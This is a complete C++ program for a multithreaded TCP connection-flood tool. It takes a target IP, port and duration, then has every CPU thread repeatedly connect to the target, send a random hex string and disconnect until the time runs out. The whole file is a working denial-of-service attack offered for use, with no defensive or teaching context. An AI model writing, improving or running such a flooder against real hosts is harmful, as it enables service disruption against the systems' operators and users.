#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <vector>
#include <thread>
#include <random>
#include <unistd.h>
#include <netinet/tcp.h>

#define PAYLOAD_SIZE 25

class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {
        thread_count = std::thread::hardware_concurrency();
        if (thread_count == 0) thread_count = 2; // Default to 2 if undetectable
    }

    void generate_payload(char* buffer, size_t size) {
        static const char hex_chars[] = "0123456789abcdef";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<int> dist(0, 15);
        
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = hex_chars[dist(gen)];
            buffer[i * 4 + 3] = hex_chars[dist(gen)];
        }
        buffer[size * 4] = '\0';
    }

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime = time(nullptr) + duration;
        char payload[PAYLOAD_SIZE * 5 + 1];
        generate_payload(payload, PAYLOAD_SIZE);

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr);

        while (time(nullptr) < endtime) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                perror("Socket creation failed");
                continue;
            }
            
            int flag = 1;
            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(int));
            
            if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                perror("Connection failed");
                close(sock);
                continue;
            }
            
            send(sock, payload, strlen(payload), MSG_NOSIGNAL);
            close(sock);
        }
    }

    void start_attack() {
        std::vector<std::thread> threads;
        for (int i = 0; i < thread_count; i++) {
            threads.emplace_back(&Attack::attack_thread, this);
        }
        for (auto& t : threads) {
            t.join();
        }
    }

private:
    std::string ip;
    int port;
    int duration;
    int thread_count;
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <IP> <PORT> <DURATION>\n";
        return 1;
    }
    
    std::string target_ip = argv[1];
    int target_port = std::stoi(argv[2]);
    int attack_duration = std::stoi(argv[3]);
    
    Attack attack(target_ip, target_port, attack_duration);
    attack.start_attack();
    
    return 0;
}
